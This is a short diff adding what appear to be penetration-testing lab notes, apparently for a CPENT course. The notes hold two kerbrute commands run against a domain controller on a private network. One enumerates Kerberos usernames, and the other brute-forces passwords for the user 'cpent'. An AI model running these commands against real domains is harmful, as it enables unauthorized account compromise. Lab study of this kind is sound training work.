@@ -1,0 +1,8 @@
+./kerbrute userenum -d ECC.LOCALNET --dc 172.25.170.80 Usernames.txt
+
+
+./kerbrute bruteuser -d ECC.LOCALNET --dc 172.25.170.80 Passwords.txt cpent (test with each user one by one that is enumrated above)
+
+
+
+
